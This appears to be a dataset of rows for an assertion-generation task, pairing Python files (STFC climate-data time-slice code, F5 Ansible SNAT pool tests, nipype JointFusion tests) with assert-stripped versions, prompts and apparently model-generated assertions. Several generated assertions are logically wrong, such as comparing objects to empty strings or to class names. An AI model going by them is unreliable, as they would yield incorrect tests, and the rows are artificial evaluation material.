      opts = self.cp.options( self.parent.model )
      if self.parent.expt == 'piControl':
        if self.parent.table == '3hr':
          if 'year_piControl_spawn_to_1pctCO2' not in opts:
            self.warning += 'start and spawn year info for 1pctCO2 not in configuration file, defaulting to 0 offset'
            self.offset= 0
            self.offset_status = 0
            return self.offset
          else:
            self.offset_status = 1
            self.offset= self.cp.get( self.parent.model, 'year_piControl_spawn_to_1pctCO2' )
            return self.offset
        else:
          if 'year_piControl_spawn_to_historical' not in opts or 'year_start_historical' not in opts:
            self.warning += 'start and spawn year info for historical not in configuration file, please amend configuration file'
            return self.offset
          else:
            self.offset_status = 1
            self.offset= self.cp.get( self.parent.model, 'year_piControl_spawn_to_historical' ) - self.cp.get( self.parent.model, 'year_stat_historical' )
            return self.offset
","
1# BSD Licence
2# Copyright (c) 2011, Science & Technology Facilities Council (STFC)
3# All rights reserved.
4#
5# See the LICENSE file in the source distribution of this software for
6# the full license text.
7
8
9import logging
10log = logging.getLogger(__name__)
11
12class request_time_slice:
13
14  def __init__(self,parent):
15    self.parent=parent
16    self.warning = ''
17
18  def in_requested_time(self,start,end):
19    self.is_in_requested_time = False
20    ssp = self.parent.request_spec
21
22    if ssp[0] in ['list','listrel']:
23        if ssp[0] == 'listrel':
24          offset = self.get_offset()
25          if self.offset_status == -1:
26            log.warning('failed to get offset [listrel]')
27            return False
28        else:
29          offset = 0
30        for s in ssp[1:]:
31          if s[0] == 'year':
32            if start-offset == s[1]:
33              self.is_in_requested_time = True
34              return True
35          elif s[0] == 'slice':
36            if start-offset <= s[2] and end-offset >= s[1]:
37              self.is_in_requested_time = True
38              return True
39
40        self.requested_time_end = ssp[-1][-1]
41        self.requested_time_start = ssp[1][1]
42        self.is_in_requested_time = False
43        return True
44
45    elif ssp[0] == 'corres':
46      ##  offset = self.get_offset()
47        ##if self.offset_status == -1:
48        log.warning('not ready for this yet [corres] -- need start time info %s %s ' % (tli, self.parent.request_col))
49        return False
50
51    return True
52
53  def load_config(self):
54    if not self.parent.config_loaded:
55        import ConfigParser
56        self.cp = ConfigParser.SafeConfigParser()
57        self.cp.read( self.parent.config )
58        self.parent.config_loaded = True
59
60  def get_offset(self):
61    self.load_config()
62    self.offset_status = -1
63    if not self.parent.model in self.cp.sections():
64      self.warning += 'model [%s] not found in configuration file sections: %s, defaulting to 0 offset;;' % (self.parent.model,str(self.cp.sections()) )
65      self.offset = 0
66      return self.offset
67    else:
68      opts = self.cp.options( self.parent.model )
69      if self.parent.expt == 'piControl':
70        if self.parent.table == '3hr':
71          if 'year_piControl_spawn_to_1pctCO2' not in opts:
72            self.warning += 'start and spawn year info for 1pctCO2 not in configuration file, defaulting to 0 offset'
73            self.offset= 0
74            self.offset_status = 0
75            return self.offset
76          else:
77            self.offset_status = 1
78            self.offset= self.cp.get( self.parent.model, 'year_piControl_spawn_to_1pctCO2' )
79            return self.offset
80        else:
81          if 'year_piControl_spawn_to_historical' not in opts or 'year_start_historical' not in opts:
82            self.warning += 'start and spawn year info for historical not in configuration file, please amend configuration file'
83            return self.offset
84          else:
85            self.offset_status = 1
86            self.offset= self.cp.get( self.parent.model, 'year_piControl_spawn_to_historical' ) - self.cp.get( self.parent.model, 'year_stat_historical' )
87            return self.offset
88","[['self.parent.config_exists', '==', 'True']]",1,1,1.0,0.0003088326127239,"['log', 'parent', 'self.warning', 'start', 'end', 'self.is_in_requested_time', 'ssp', 'offset', 'self.requested_time_end', 'self.requested_time_start', '##  offset', 'self.cp', 'self.parent.config_loaded', 'self.offset_status', 'self.offset', 'opts']",16,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['log', 'parent', 'self.warning', 'start', 'end', 'self.is_in_requested_time', 'ssp', 'offset', 'self.requested_time_end', 'self.requested_time_start', '##  offset', 'self.cp', 'self.parent.config_loaded', 'self.offset_status', 'self.offset', 'opts']
*Code:

1# BSD Licence
2# Copyright (c) 2011, Science & Technology Facilities Council (STFC)
3# All rights reserved.
4#
5# See the LICENSE file in the source distribution of this software for
6# the full license text.
7
8
9import logging
10log = logging.getLogger(__name__)
11
12class request_time_slice:
13
14  def __init__(self,parent):
15    self.parent=parent
16    self.warning = ''
17
18  def in_requested_time(self,start,end):
19    self.is_in_requested_time = False
20    ssp = self.parent.request_spec
21
22    if ssp[0] in ['list','listrel']:
23        if ssp[0] == 'listrel':
24          offset = self.get_offset()
25          if self.offset_status == -1:
26            log.warning('failed to get offset [listrel]')
27            return False
28        else:
29          offset = 0
30        for s in ssp[1:]:
31          if s[0] == 'year':
32            if start-offset == s[1]:
33              self.is_in_requested_time = True
34              return True
35          elif s[0] == 'slice':
36            if start-offset <= s[2] and end-offset >= s[1]:
37              self.is_in_requested_time = True
38              return True
39
40        self.requested_time_end = ssp[-1][-1]
41        self.requested_time_start = ssp[1][1]
42        self.is_in_requested_time = False
43        return True
44
45    elif ssp[0] == 'corres':
46      ##  offset = self.get_offset()
47        ##if self.offset_status == -1:
48        log.warning('not ready for this yet [corres] -- need start time info %s %s ' % (tli, self.parent.request_col))
49        return False
50
51    return True
52
53  def load_config(self):
54    if not self.parent.config_loaded:
55        import ConfigParser
56        self.cp = ConfigParser.SafeConfigParser()
57        self.cp.read( self.parent.config )
58        self.parent.config_loaded = True
59
60  def get_offset(self):
61    self.load_config()
62    self.offset_status = -1
63    if not self.parent.model in self.cp.sections():
64      self.warning += 'model [%s] not found in configuration file sections: %s, defaulting to 0 offset;;' % (self.parent.model,str(self.cp.sections()) )
65      self.offset = 0
66      return self.offset
67    else:
68      opts = self.cp.options( self.parent.model )
69      if self.parent.expt == 'piControl':
70        if self.parent.table == '3hr':
71          if 'year_piControl_spawn_to_1pctCO2' not in opts:
72            self.warning += 'start and spawn year info for 1pctCO2 not in configuration file, defaulting to 0 offset'
73            self.offset= 0
74            self.offset_status = 0
75            return self.offset
76          else:
77            self.offset_status = 1
78            self.offset= self.cp.get( self.parent.model, 'year_piControl_spawn_to_1pctCO2' )
79            return self.offset
80        else:
81          if 'year_piControl_spawn_to_historical' not in opts or 'year_start_historical' not in opts:
82            self.warning += 'start and spawn year info for historical not in configuration file, please amend configuration file'
83            return self.offset
84          else:
85            self.offset_status = 1
86            self.offset= self.cp.get( self.parent.model, 'year_piControl_spawn_to_historical' ) - self.cp.get( self.parent.model, 'year_stat_historical' )
87            return self.offset
88",4937,"[[14, 'parent', '!=', None, ""a parent instance is required for the class initialization""],
[66, 'self.offset', '==', 0, ""offset should be initialized as 0 when model not found in configuration file sections""],
[74, 'self.offset', '==', 0, ""offset should be set to 0 when start and spawn year info for 1pctCO2 not in configuration file""],
[81, 'self.offset', '!=', None, ""offset should not be None when configuration file needs amendment""],
[87, 'self.offset', '!=', None, ""offset should not be None after setting offset_information""]]"
hkariti/ansible,"# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 F5 Networks Inc.
# GNU General Public License v3.0 (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)

from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

import os
import json
import sys

from nose.plugins.skip import SkipTest
if sys.version_info < (2, 7):
    raise SkipTest(""F5 Ansible modules require Python >= 2.7"")

from ansible.compat.tests import unittest
from ansible.compat.tests.mock import Mock
from ansible.compat.tests.mock import patch
from ansible.module_utils.basic import AnsibleModule

try:
    from library.bigip_snat_pool import Parameters
    from library.bigip_snat_pool import ModuleManager
    from library.bigip_snat_pool import ArgumentSpec
    from library.module_utils.network.f5.common import F5ModuleError
    from library.module_utils.network.f5.common import iControlUnexpectedHTTPError
    from test.unit.modules.utils import set_module_args
except ImportError:
    try:
        from ansible.modules.network.f5.bigip_snat_pool import Parameters
        from ansible.modules.network.f5.bigip_snat_pool import ModuleManager
        from ansible.modules.network.f5.bigip_snat_pool import ArgumentSpec
        from ansible.module_utils.network.f5.common import F5ModuleError
        from ansible.module_utils.network.f5.common import iControlUnexpectedHTTPError
        from units.modules.utils import set_module_args
    except ImportError:
        raise SkipTest(""F5 Ansible modules require the f5-sdk Python library"")

fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures')
fixture_data = {}


def load_fixture(name):
    path = os.path.join(fixture_path, name)

    if path in fixture_data:
        return fixture_data[path]

    with open(path) as f:
        data = f.read()

    try:
        data = json.loads(data)
    except Exception:
        pass

    fixture_data[path] = data
    return data


class TestParameters(unittest.TestCase):
    def test_module_parameters(self):
        args = dict(
            name='my-snat-pool',
            state='present',
            members=['10.10.10.10', '20.20.20.20'],
            partition='Common'
        )
        p = Parameters(params=args)
        assert p.name == 'my-snat-pool'
        assert p.state == 'present'
        assert len(p.members) == 2
        assert '/Common/10.10.10.10' in p.members
        assert '/Common/20.20.20.20' in p.members

    def test_api_parameters(self):
        args = dict(
            members=['/Common/10.10.10.10', '/foo/20.20.20.20']
        )
        p = Parameters(params=args)
        assert len(p.members) == 2
        assert '/Common/10.10.10.10' in p.members
        assert '/Common/20.20.20.20' in p.members


class TestManager(unittest.TestCase):

    def setUp(self):
        self.spec = ArgumentSpec()

    def test_create_snat_pool(self, *args):
        set_module_args(dict(
            name='my-snat-pool',
            state='present',
            members=['10.10.10.10', '20.20.20.20'],
            password='passsword',
            server='localhost',
            user='admin'
        ))

        module = AnsibleModule(
            argument_spec=self.spec.argument_spec,
            supports_check_mode=self.spec.supports_check_mode
        )
        mm = ModuleManager(module=module)

        # Override methods to force specific logic in the module to happen
        mm.exists = Mock(side_effect=[False, True])
        mm.create_on_device = Mock(return_value=True)

        results = mm.exec_module()

        assert results['changed'] is True
        assert len(results['members']) == 2
        assert '/Common/10.10.10.10' in results['members']
        assert '/Common/20.20.20.20' in results['members']

    def test_create_snat_pool_idempotent(self, *args):
        set_module_args(dict(
            name='asdasd',
            state='present',
            members=['1.1.1.1', '2.2.2.2'],
            password='passsword',
            server='localhost',
            user='admin'
        ))

        current = Parameters(params=load_fixture('load_ltm_snatpool.json'))

        module = AnsibleModule(
            argument_spec=self.spec.argument_spec,
            supports_check_mode=self.spec.supports_check_mode
        )
        mm = ModuleManager(module=module)

        # Override methods to force specific logic in the module to happen
        mm.exists = Mock(side_effect=[True, True])
        mm.read_current_from_device = Mock(return_value=current)

        results = mm.exec_module()

        assert results['changed'] is False

    def test_update_snat_pool(self, *args):
        set_module_args(dict(
            name='asdasd',
            state='present',
            members=['30.30.30.30'],
            password='passsword',
            server='localhost',
            user='admin'
        ))

        current = Parameters(params=load_fixture('load_ltm_snatpool.json'))

        module = AnsibleModule(
            argument_spec=self.spec.argument_spec,
            supports_check_mode=self.spec.supports_check_mode
        )
        mm = ModuleManager(module=module)

        # Override methods to force specific logic in the module to happen
        mm.read_current_from_device = Mock(return_value=current)
        mm.update_on_device = Mock(return_value=True)
        mm.exists = Mock(return_value=True)
        mm.create_on_device = Mock(return_value=True)

        results = mm.exec_module()

        assert results['changed'] is True
        assert len(results['members']) == 1
        assert '/Common/30.30.30.30' in results['members']
","
1# -*- coding: utf-8 -*-
2#
3# Copyright (c) 2017 F5 Networks Inc.
4# GNU General Public License v3.0 (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)
5
6from __future__ import (absolute_import, division, print_function)
7__metaclass__ = type
8
9import os
10import json
11import sys
12
13from nose.plugins.skip import SkipTest
14if sys.version_info < (2, 7):
15    raise SkipTest(""F5 Ansible modules require Python >= 2.7"")
16
17from ansible.compat.tests import unittest
18from ansible.compat.tests.mock import Mock
19from ansible.compat.tests.mock import patch
20from ansible.module_utils.basic import AnsibleModule
21
22try:
23    from library.bigip_snat_pool import Parameters
24    from library.bigip_snat_pool import ModuleManager
25    from library.bigip_snat_pool import ArgumentSpec
26    from library.module_utils.network.f5.common import F5ModuleError
27    from library.module_utils.network.f5.common import iControlUnexpectedHTTPError
28    from test.unit.modules.utils import set_module_args
29except ImportError:
30    try:
31        from ansible.modules.network.f5.bigip_snat_pool import Parameters
32        from ansible.modules.network.f5.bigip_snat_pool import ModuleManager
33        from ansible.modules.network.f5.bigip_snat_pool import ArgumentSpec
34        from ansible.module_utils.network.f5.common import F5ModuleError
35        from ansible.module_utils.network.f5.common import iControlUnexpectedHTTPError
36        from units.modules.utils import set_module_args
37    except ImportError:
38        raise SkipTest(""F5 Ansible modules require the f5-sdk Python library"")
39
40fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures')
41fixture_data = {}
42
43
44def load_fixture(name):
45    path = os.path.join(fixture_path, name)
46
47    if path in fixture_data:
48        return fixture_data[path]
49
50    with open(path) as f:
51        data = f.read()
52
53    try:
54        data = json.loads(data)
55    except Exception:
56        pass
57
58    fixture_data[path] = data
59    return data
60
61
62class TestParameters(unittest.TestCase):
63    def test_module_parameters(self):
64        args = dict(
65            name='my-snat-pool',
66            state='present',
67            members=['10.10.10.10', '20.20.20.20'],
68            partition='Common'
69        )
70        p = Parameters(params=args)
71
72    def test_api_parameters(self):
73        args = dict(
74            members=['/Common/10.10.10.10', '/foo/20.20.20.20']
75        )
76        p = Parameters(params=args)
77
78
79class TestManager(unittest.TestCase):
80
81    def setUp(self):
82        self.spec = ArgumentSpec()
83
84    def test_create_snat_pool(self, *args):
85        set_module_args(dict(
86            name='my-snat-pool',
87            state='present',
88            members=['10.10.10.10', '20.20.20.20'],
89            password='passsword',
90            server='localhost',
91            user='admin'
92        ))
93
94        module = AnsibleModule(
95            argument_spec=self.spec.argument_spec,
96            supports_check_mode=self.spec.supports_check_mode
97        )
98        mm = ModuleManager(module=module)
99
100        # Override methods to force specific logic in the module to happen
101        mm.exists = Mock(side_effect=[False, True])
102        mm.create_on_device = Mock(return_value=True)
103
104        results = mm.exec_module()
105
106
107    def test_create_snat_pool_idempotent(self, *args):
108        set_module_args(dict(
109            name='asdasd',
110            state='present',
111            members=['1.1.1.1', '2.2.2.2'],
112            password='passsword',
113            server='localhost',
114            user='admin'
115        ))
116
117        current = Parameters(params=load_fixture('load_ltm_snatpool.json'))
118
119        module = AnsibleModule(
120            argument_spec=self.spec.argument_spec,
121            supports_check_mode=self.spec.supports_check_mode
122        )
123        mm = ModuleManager(module=module)
124
125        # Override methods to force specific logic in the module to happen
126        mm.exists = Mock(side_effect=[True, True])
127        mm.read_current_from_device = Mock(return_value=current)
128
129        results = mm.exec_module()
130
131
132    def test_update_snat_pool(self, *args):
133        set_module_args(dict(
134            name='asdasd',
135            state='present',
136            members=['30.30.30.30'],
137            password='passsword',
138            server='localhost',
139            user='admin'
140        ))
141
142        current = Parameters(params=load_fixture('load_ltm_snatpool.json'))
143
144        module = AnsibleModule(
145            argument_spec=self.spec.argument_spec,
146            supports_check_mode=self.spec.supports_check_mode
147        )
148        mm = ModuleManager(module=module)
149
150        # Override methods to force specific logic in the module to happen
151        mm.read_current_from_device = Mock(return_value=current)
152        mm.update_on_device = Mock(return_value=True)
153        mm.exists = Mock(return_value=True)
154        mm.create_on_device = Mock(return_value=True)
155
156        results = mm.exec_module()
157
158","[['p.name', '==', ""'my-snat-pool'""], ['p.state', '==', ""'present'""], ['len(p.members)', '==', '2'], ['len(p.members)', '==', '2'], [""results['changed']"", '==', 'True'], [""len(results['members'])"", '==', '2'], [""results['changed']"", '==', 'False'], [""results['changed']"", '==', 'True'], [""len(results['members'])"", '==', '1']]",16,9,0.5625,0.0016051364365971,"['__metaclass__', 'fixture_path', 'fixture_data', 'name', 'path', 'data', 'fixture_data[path]', 'args', 'p', 'self.spec', '*args', 'module', 'mm', 'mm.exists', 'mm.create_on_device', 'results', 'current', 'mm.read_current_from_device', 'mm.update_on_device']",19,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__metaclass__', 'fixture_path', 'fixture_data', 'name', 'path', 'data', 'fixture_data[path]', 'args', 'p', 'self.spec', '*args', 'module', 'mm', 'mm.exists', 'mm.create_on_device', 'results', 'current', 'mm.read_current_from_device', 'mm.update_on_device']
*Code:

1# -*- coding: utf-8 -*-
2#
3# Copyright (c) 2017 F5 Networks Inc.
4# GNU General Public License v3.0 (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)
5
6from __future__ import (absolute_import, division, print_function)
7__metaclass__ = type
8
9import os
10import json
11import sys
12
13from nose.plugins.skip import SkipTest
14if sys.version_info < (2, 7):
15    raise SkipTest(""F5 Ansible modules require Python >= 2.7"")
16
17from ansible.compat.tests import unittest
18from ansible.compat.tests.mock import Mock
19from ansible.compat.tests.mock import patch
20from ansible.module_utils.basic import AnsibleModule
21
22try:
23    from library.bigip_snat_pool import Parameters
24    from library.bigip_snat_pool import ModuleManager
25    from library.bigip_snat_pool import ArgumentSpec
26    from library.module_utils.network.f5.common import F5ModuleError
27    from library.module_utils.network.f5.common import iControlUnexpectedHTTPError
28    from test.unit.modules.utils import set_module_args
29except ImportError:
30    try:
31        from ansible.modules.network.f5.bigip_snat_pool import Parameters
32        from ansible.modules.network.f5.bigip_snat_pool import ModuleManager
33        from ansible.modules.network.f5.bigip_snat_pool import ArgumentSpec
34        from ansible.module_utils.network.f5.common import F5ModuleError
35        from ansible.module_utils.network.f5.common import iControlUnexpectedHTTPError
36        from units.modules.utils import set_module_args
37    except ImportError:
38        raise SkipTest(""F5 Ansible modules require the f5-sdk Python library"")
39
40fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures')
41fixture_data = {}
42
43
44def load_fixture(name):
45    path = os.path.join(fixture_path, name)
46
47    if path in fixture_data:
48        return fixture_data[path]
49
50    with open(path) as f:
51        data = f.read()
52
53    try:
54        data = json.loads(data)
55    except Exception:
56        pass
57
58    fixture_data[path] = data
59    return data
60
61
62class TestParameters(unittest.TestCase):
63    def test_module_parameters(self):
64        args = dict(
65            name='my-snat-pool',
66            state='present',
67            members=['10.10.10.10', '20.20.20.20'],
68            partition='Common'
69        )
70        p = Parameters(params=args)
71
72    def test_api_parameters(self):
73        args = dict(
74            members=['/Common/10.10.10.10', '/foo/20.20.20.20']
75        )
76        p = Parameters(params=args)
77
78
79class TestManager(unittest.TestCase):
80
81    def setUp(self):
82        self.spec = ArgumentSpec()
83
84    def test_create_snat_pool(self, *args):
85        set_module_args(dict(
86            name='my-snat-pool',
87            state='present',
88            members=['10.10.10.10', '20.20.20.20'],
89            password='passsword',
90            server='localhost',
91            user='admin'
92        ))
93
94        module = AnsibleModule(
95            argument_spec=self.spec.argument_spec,
96            supports_check_mode=self.spec.supports_check_mode
97        )
98        mm = ModuleManager(module=module)
99
100        # Override methods to force specific logic in the module to happen
101        mm.exists = Mock(side_effect=[False, True])
102        mm.create_on_device = Mock(return_value=True)
103
104        results = mm.exec_module()
105
106
107    def test_create_snat_pool_idempotent(self, *args):
108        set_module_args(dict(
109            name='asdasd',
110            state='present',
111            members=['1.1.1.1', '2.2.2.2'],
112            password='passsword',
113            server='localhost',
114            user='admin'
115        ))
116
117        current = Parameters(params=load_fixture('load_ltm_snatpool.json'))
118
119        module = AnsibleModule(
120            argument_spec=self.spec.argument_spec,
121            supports_check_mode=self.spec.supports_check_mode
122        )
123        mm = ModuleManager(module=module)
124
125        # Override methods to force specific logic in the module to happen
126        mm.exists = Mock(side_effect=[True, True])
127        mm.read_current_from_device = Mock(return_value=current)
128
129        results = mm.exec_module()
130
131
132    def test_update_snat_pool(self, *args):
133        set_module_args(dict(
134            name='asdasd',
135            state='present',
136            members=['30.30.30.30'],
137            password='passsword',
138            server='localhost',
139            user='admin'
140        ))
141
142        current = Parameters(params=load_fixture('load_ltm_snatpool.json'))
143
144        module = AnsibleModule(
145            argument_spec=self.spec.argument_spec,
146            supports_check_mode=self.spec.supports_check_mode
147        )
148        mm = ModuleManager(module=module)
149
150        # Override methods to force specific logic in the module to happen
151        mm.read_current_from_device = Mock(return_value=current)
152        mm.update_on_device = Mock(return_value=True)
153        mm.exists = Mock(return_value=True)
154        mm.create_on_device = Mock(return_value=True)
155
156        results = mm.exec_module()
157
158",6874,"[[40, 'fixture_path', '!=', '', 'fixture_path should be not empty'],
 [61, 'args', '!=', '', 'Dictionary args should have keys and values in it'],
 [61, 'args', '==', dict, 'Dictionary args should be of type dict'],
 [70, 'p', '!=', '', 'Object Parameters should be not None'],
 [84, '*args', '>=', 0, '*args can be an empty tuple, but not None'],
 [84, 'self.spec', '!=', '', 'Object ArgumentSpec should be not None'],
 [94, 'module', '!=', '', 'Object module should be not None'],
 [94, 'module', '==', AnsibleModule, 'module should be an instance of AnsibleModule'],
 [98, 'mm', '!=', '', 'Object ModuleManager should be not None'],
 [102, 'mm.exists', '!=', '', 'Mock function ""exists"" of object mm should be not None'],
 [102, 'mm.create_on_device', '!=', '', 'Mock function ""create_on_device"" of object mm should be not None'],
 [117, 'current', '!=', '', 'Object Parameters should be not None'],
 [123, 'mm', '!=', '', 'Object ModuleManager should be not None'],
 [126, 'mm.exists', '!=', '', 'Mock function ""exists"" of object mm should be not None'],
 [127, 'mm.read_current_from_device', '!=', '', 'Mock function ""read_current_from_device"" of object mm should be not None'],
 [142, 'current', '!=', '', 'Object Parameters should be not None'],
 [148, 'mm', '!=', '', 'Object ModuleManager should be not None'],
 [154, 'mm.exists', '!=', '', 'Mock function ""exists"" of object mm should be not None'],
 [153, 'mm.update_on_device', '!=', '', 'Mock function ""update_on_device"" of object mm should be not None'],
 [154, 'mm.create_on_device', '!=', '', 'Mock function ""create_on_device"" of object mm should be not None']]"
mick-d/nipype,"# -*- coding: utf-8 -*-
from __future__ import division
from builtins import range
from nipype.testing import example_data
from nipype.interfaces.base import InputMultiPath
from traits.trait_errors import TraitError
from nipype.interfaces.ants import JointFusion
import pytest

def test_JointFusion_dimension():
    at = JointFusion()
    set_dimension = lambda d: setattr(at.inputs, 'dimension', int(d))
    for d in range(2, 5):
        set_dimension(d)
        assert at.inputs.dimension == int(d)
    for d in [0, 1, 6, 7]:
        with pytest.raises(TraitError):
            set_dimension(d)

@pytest.mark.parametrize(""m"", range(1, 5))
def test_JointFusion_modalities(m):
    at = JointFusion()
    setattr(at.inputs, 'modalities', int(m))
    assert at.inputs.modalities == int(m)

@pytest.mark.parametrize(""a, b"", [(a,b) for a in range(10) for b in range(10)])
def test_JointFusion_method(a, b):
    at = JointFusion()
    set_method = lambda a, b: setattr(at.inputs, 'method', 'Joint[%.1f,%d]'.format(a, b))
    _a = a / 10.0
    set_method(_a, b)
    # set directly
    assert at.inputs.method == 'Joint[%.1f,%d]'.format(_a, b)
    aprime = _a + 0.1
    bprime = b + 1
    at.inputs.alpha = aprime
    at.inputs.beta = bprime
    # set with alpha/beta
    assert at.inputs.method == 'Joint[%.1f,%d]'.format(aprime, bprime)

@pytest.mark.parametrize(""attr, x"", [(attr, x) for attr in ['patch_radius', 'search_radius'] for x in range(5)])
def test_JointFusion_radius(attr, x):
    at = JointFusion()
    setattr(at.inputs, attr, [x, x+1, x**x])
    assert at._format_arg(attr, None, getattr(at.inputs, attr))[4:] == '{0}x{1}x{2}'.format(x, x + 1, x**x)


def test_JointFusion_cmd():
    at = JointFusion()
    at.inputs.dimension = 3
    at.inputs.modalities = 1
    at.inputs.method = 'Joint[0.1,2]'
    at.inputs.output_label_image = 'fusion_labelimage_output.nii'
    warped_intensity_images = [example_data('im1.nii'),
                               example_data('im2.nii')]
    at.inputs.warped_intensity_images = warped_intensity_images
    segmentation_images = [example_data('segmentation0.nii.gz'),
                           example_data('segmentation1.nii.gz')]
    at.inputs.warped_label_images = segmentation_images
    T1_image = example_data('T1.nii')
    at.inputs.target_image = T1_image
    at.inputs.patch_radius = [3, 2, 1]
    at.inputs.search_radius = [1, 2, 3]
    expected_command = ('jointfusion 3 1 -m Joint[0.1,2] -rp 3x2x1 -rs 1x2x3'
                        ' -tg %s -g %s -g %s -l %s -l %s'
                        ' fusion_labelimage_output.nii') % (T1_image,
                                                            warped_intensity_images[0],
                                                            warped_intensity_images[1],
                                                            segmentation_images[0],
                                                            segmentation_images[1])
    assert at.cmdline == expected_command
    # setting intensity or labels with unequal lengths raises error
    with pytest.raises(AssertionError):
        at._format_arg('warped_intensity_images', InputMultiPath, warped_intensity_images + [example_data('im3.nii')])
","
1# -*- coding: utf-8 -*-
2from __future__ import division
3from builtins import range
4from nipype.testing import example_data
5from nipype.interfaces.base import InputMultiPath
6from traits.trait_errors import TraitError
7from nipype.interfaces.ants import JointFusion
8import pytest
9
10def test_JointFusion_dimension():
11    at = JointFusion()
12    set_dimension = lambda d: setattr(at.inputs, 'dimension', int(d))
13    for d in range(2, 5):
14        set_dimension(d)
15    for d in [0, 1, 6, 7]:
16        with pytest.raises(TraitError):
17            set_dimension(d)
18
19@pytest.mark.parametrize(""m"", range(1, 5))
20def test_JointFusion_modalities(m):
21    at = JointFusion()
22    setattr(at.inputs, 'modalities', int(m))
23
24@pytest.mark.parametrize(""a, b"", [(a,b) for a in range(10) for b in range(10)])
25def test_JointFusion_method(a, b):
26    at = JointFusion()
27    set_method = lambda a, b: setattr(at.inputs, 'method', 'Joint[%.1f,%d]'.format(a, b))
28    _a = a / 10.0
29    set_method(_a, b)
30    # set directly
31    aprime = _a + 0.1
32    bprime = b + 1
33    at.inputs.alpha = aprime
34    at.inputs.beta = bprime
35    # set with alpha/beta
36
37@pytest.mark.parametrize(""attr, x"", [(attr, x) for attr in ['patch_radius', 'search_radius'] for x in range(5)])
38def test_JointFusion_radius(attr, x):
39    at = JointFusion()
40    setattr(at.inputs, attr, [x, x+1, x**x])
41
42
43def test_JointFusion_cmd():
44    at = JointFusion()
45    at.inputs.dimension = 3
46    at.inputs.modalities = 1
47    at.inputs.method = 'Joint[0.1,2]'
48    at.inputs.output_label_image = 'fusion_labelimage_output.nii'
49    warped_intensity_images = [example_data('im1.nii'),
50                               example_data('im2.nii')]
51    at.inputs.warped_intensity_images = warped_intensity_images
52    segmentation_images = [example_data('segmentation0.nii.gz'),
53                           example_data('segmentation1.nii.gz')]
54    at.inputs.warped_label_images = segmentation_images
55    T1_image = example_data('T1.nii')
56    at.inputs.target_image = T1_image
57    at.inputs.patch_radius = [3, 2, 1]
58    at.inputs.search_radius = [1, 2, 3]
59    expected_command = ('jointfusion 3 1 -m Joint[0.1,2] -rp 3x2x1 -rs 1x2x3'
60                        ' -tg %s -g %s -g %s -l %s -l %s'
61                        ' fusion_labelimage_output.nii') % (T1_image,
62                                                            warped_intensity_images[0],
63                                                            warped_intensity_images[1],
64                                                            segmentation_images[0],
65                                                            segmentation_images[1])
66    # setting intensity or labels with unequal lengths raises error
67    with pytest.raises(AssertionError):
68        at._format_arg('warped_intensity_images', InputMultiPath, warped_intensity_images + [example_data('im3.nii')])
69","[['at.inputs.dimension', '==', 'int(d)'], ['at.inputs.modalities', '==', 'int(m)'], ['at.inputs.method', '==', ""'Joint[%.1f""], ['at.inputs.method', '==', ""'Joint[%.1f""], ['at._format_arg(attr', '==', 'True'], ['at.cmdline', '==', 'expected_comm']]",6,6,1.0,0.0018691588785046,"['at', 'set_dimension', 'm', 'a', 'b', 'set_method', '_a', 'aprime', 'bprime', 'at.inputs.alpha', 'at.inputs.beta', 'attr', 'x', 'at.inputs.dimension', 'at.inputs.modalities', 'at.inputs.method', 'at.inputs.output_label_image', 'warped_intensity_images', 'at.inputs.warped_intensity_images', 'segmentation_images', 'at.inputs.warped_label_images', 'T1_image', 'at.inputs.target_image', 'at.inputs.patch_radius', 'at.inputs.search_radius', 'expected_command']",26,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
